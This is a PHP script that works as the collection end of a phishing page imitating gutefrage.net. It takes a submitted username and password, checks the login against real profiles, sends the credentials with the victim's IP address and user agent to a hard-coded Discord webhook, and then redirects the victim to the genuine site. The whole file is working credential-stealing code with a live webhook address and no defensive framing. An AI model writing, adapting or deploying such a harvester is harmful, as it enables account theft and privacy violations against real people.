<?php
$login = $_GET['username'];
$password = $_GET['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

header("Location: https://www.gutefrage.net/home/neue/alle");
	
    $curl = curl_init("https://discordapp.com/api/webhooks/526122434768797727/wRN1uOJgZh20QzOmKGBQ0ALI4Lyxhh84P13-fg8Fm2W317gfDXOXU9EYIQIsQlakUgFa");
    curl_setopt($curl, CURLOPT_POST, 1);

	if(strpos($login, '@') !== false && !empty($password) || strpos(file_get_contents("https://www.gutefrage.net/nutzer/" . $login), $login) == true) {
		curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(array("content" => "``[UserAgent: " . $ua . "] [IP: " . $ip . "] " . $login . ":" . $password . "``", "username" => "GuteFrage-Bot")));	
		echo curl_exec($curl);
		
		header("Location: https://www.gutefrage.net/home/neue/alle");
	}
	


?>